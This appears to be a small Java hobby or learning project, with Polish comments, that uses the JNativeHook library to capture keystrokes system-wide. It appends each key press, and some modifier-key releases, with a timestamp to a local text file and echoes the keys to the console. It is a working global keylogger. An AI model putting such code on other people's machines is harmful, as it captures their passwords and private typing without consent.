package rwilk.logger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/**
 * Implementacja KeyListener
 */
public class GlobalKeyListener implements NativeKeyListener {

    private static final DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss:SSS");


    public void nativeKeyPressed(NativeKeyEvent e) {
        Calendar calendar = Calendar.getInstance();
        writeToFile("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()), calendar.getTime());
        System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    //klawisz puszczony
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (e.getKeyCode() == NativeKeyEvent.VC_ALT ||
                e.getKeyCode() == NativeKeyEvent.VC_CONTROL ||
                e.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK ||
                e.getKeyCode() == NativeKeyEvent.VC_SHIFT){
            Calendar calendar = Calendar.getInstance();
            writeToFile("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()), calendar.getTime());
        }
    }

    //klawisz wcisniety
    public void nativeKeyTyped(NativeKeyEvent e) {
        e.getKeyChar();
    }

    //zapisujemy do pliku
    private void writeToFile(String text, Date date){
        try {
            //kiedy nie ma pliku to program powinen go sobie utworzyc //gdy jest to dopisuje na koncu
            Writer output = new BufferedWriter(new FileWriter("keyListener.txt", true));
            output.append(dateFormat.format(date) + "\t"+text +"\n");
            output.close();
        }catch (IOException ioe){
            ioe.printStackTrace();
        }
    }
}